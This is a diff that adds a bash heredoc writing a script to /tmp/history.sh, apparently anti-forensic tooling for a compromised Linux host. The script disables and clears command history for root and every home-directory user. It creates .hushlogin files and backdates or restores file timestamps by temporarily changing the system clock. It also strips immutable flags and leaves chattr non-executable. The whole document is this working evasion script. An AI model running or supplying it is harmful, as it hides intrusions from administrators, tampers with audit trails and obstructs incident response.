@@ -1,1 +1,63 @@
-test
+cat << 'EOF' > /tmp/history.sh
+#!/bin/bash
+
+apt install e2fsprogs -y
+chmod 777 /usr/bin/chattr
+chmod 777 /bin/chattr
+
+#=== Process for root User
+time_root_bash_logout=$(stat /root/.bash_logout | grep Change | cut -d " " -f2,3 | cut -d "." -f1)
+time_root_bashrc=$(stat /root/.bashrc | grep Change | cut -d " " -f2,3 | cut -d "." -f1)
+
+chattr -iua /root/.bash_logout
+chattr -iua /root/.bashrc
+
+sed -i '/history -c/d' /root/.bash_logout
+sed -i '/unset HISTFILE/d' /root/.bashrc
+sed -i '/export LESSHISTFILE="-"/d' /root/.bashrc
+sed -i '/set +o history/d' /etc/profile
+
+sed -i '1 i\history -c' /root/.bash_logout
+sed -i '1 i\export LESSHISTFILE="-"' /root/.bashrc
+sed -i '1 i\unset HISTFILE' /root/.bashrc
+sed -i '1 i\set +o history' /etc/profile
+
+bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/root/.bash_logout" "$time_root_bash_logout"
+bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/root/.bashrc" "$time_root_bashrc"
+bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/etc/profile" "2020-01-22 12:01:00"
+
+
+#=== Process Users
+users=$(ls -la /home/  | awk '{print $9}' | grep -v '\.' | grep -v '^$')
+for user in $users
+do
+    touch /home/$user/.hushlogin
+    touch /root/.hushlogin    
+    bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/home/$user/.hushlogin" "2020-01-22 12:01:00"
+    bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/root/.hushlogin" "2020-01-22 12:01:00"    
+    chown $user.$user /home/$user/.hushlogin
+    chown root.root /root/.hushlogin    
+
+    time_users_bash_logout=$(stat /home/$user/.bash_logout | grep Change | cut -d " " -f2,3 | cut -d "." -f1)
+    time_users_bashrc=$(stat /home/$user/.bashrc | grep Change | cut -d " " -f2,3 | cut -d "." -f1)
+
+    chattr -iua /home/$user/.bash_logout
+    chattr -iua /home/$user/.bashrc
+
+    sed -i '/history -c/d' /home/$user/.bash_logout 
+    sed -i '/unset HISTFILE/d' /home/$user/.bashrc
+    sed -i '/export LESSHISTFILE="-"/d' /home/$user/.bashrc
+
+    sed -i '1 i\history -c' /home/$user/.bash_logout
+    sed -i '1 i\export LESSHISTFILE="-"' /home/$user/.bashrc   
+    sed -i '1 i\unset HISTFILE' /home/$user/.bashrc
+
+    bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/home/$user/.bash_logout" "$time_users_bash_logout"
+    bash -c 'NOW=$(date +@%s); date -s "$2"; touch "$1"; date -s "$NOW"' -- "/home/$user/.bashrc" "$time_users_bashrc"    
+
+done
+
+chmod 444 /usr/bin/chattr
+chmod 444 /bin/chattr
+
+EOF
